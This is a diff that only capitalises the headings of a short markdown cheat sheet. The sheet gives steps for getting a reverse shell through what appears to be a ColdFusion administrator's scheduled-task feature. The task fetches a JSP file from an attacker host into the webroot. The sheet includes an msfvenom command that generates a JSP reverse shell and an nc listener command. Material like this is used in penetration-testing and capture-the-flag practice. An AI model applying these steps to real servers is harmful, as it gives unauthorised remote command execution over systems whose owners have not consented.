@@ -1,14 +1,14 @@
-### get path to webroot
+### Get path to webroot
 ```
 Server Settings > Mappings
 ```
 
-### get reverse shell using scheduled task
+### Get reverse shell using scheduled task
 ```
 Debugging & Logging > Scheduled Tasks > Schedule New Task
 ```
 
-### insert parameters
+### Insert parameters
 ```
 Task Name: <name>
 URL: http://<lhost>/<file>.jsp
@@ -17,17 +17,17 @@ File: <path>\<file>.jsp
 Submit
 ```
 
-### generate reverse shell
+### Generate reverse shell
 ```
 msfvenom -p java/jsp_shell_reverse_tcp lhost=<lhost> lport=<lport> -f raw > <file>.jsp
 ```
 
-### start listener
+### Start listener
 ```
 nc -lnvp <lport>
 ```
 
-### start task
+### Start task
 ```
 Actions > Run Scheduled Task
 ```
